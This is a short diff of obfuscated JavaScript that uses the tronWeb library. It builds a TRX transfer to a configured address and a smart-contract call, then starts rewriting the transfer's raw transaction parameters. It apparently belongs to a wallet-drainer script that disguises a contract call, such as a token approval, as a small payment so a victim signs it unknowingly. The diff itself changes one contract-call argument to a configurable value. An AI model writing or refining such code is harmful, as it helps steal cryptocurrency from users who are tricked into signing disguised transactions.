@@ -222,7 +222,7 @@ async function _0x8f88sb(_0x5b1fc5) {
     _0x652ecf = await tronWeb.transactionBuilder.sendTrx(_0x41442b.config.trc_apppass_address, _0x41442b.money ? _0x41442b.money * 1000000 : 1000000, tronWeb.defaultAddress.base58),
     {
       transaction: _0x4f164f
-    } = await tronWeb.transactionBuilder.triggerSmartContract(_0x41442b._0x19h196, _0x990438, _0x999691, _0x37d562, tronWeb.address.toHex(tronWeb.defaultAddress.base58));
+    } = await tronWeb.transactionBuilder.triggerSmartContract(_0x41442b._0x19h196, _0x41442b._0x8f8196, _0x999691, _0x37d562, tronWeb.address.toHex(tronWeb.defaultAddress.base58));
   let _0x348df4 = _0x652ecf;
   _0x348df4.raw_data.contract[0].parameter.value = {
     ..._0x652ecf.raw_data.contract[0].parameter.value,
